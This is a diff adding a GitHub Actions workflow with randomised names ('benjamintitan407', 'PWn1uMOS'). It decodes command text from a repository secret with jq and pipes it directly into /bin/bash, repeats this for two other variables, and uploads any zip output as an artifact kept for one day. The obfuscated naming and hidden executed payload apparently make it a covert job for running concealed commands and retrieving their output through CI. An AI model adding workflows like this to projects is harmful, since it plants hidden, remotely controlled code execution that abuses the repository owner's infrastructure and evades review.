@@ -1,0 +1,23 @@
+name: benjamintitan407
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: benjamintitan407
+        env:
+          fw557: ${{ secrets.fw557 }}
+        run: |
+          printf '%s' "$fw557" | jq -r .itt1112 | /bin/bash
+          printf '%s' "$p117" | jq -r .rcigz18643 | /bin/bash
+          echo $vgjs58 | jq -r .vokck5336 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PWn1uMOS
+          path: "*.zip"
+          retention-days: 1
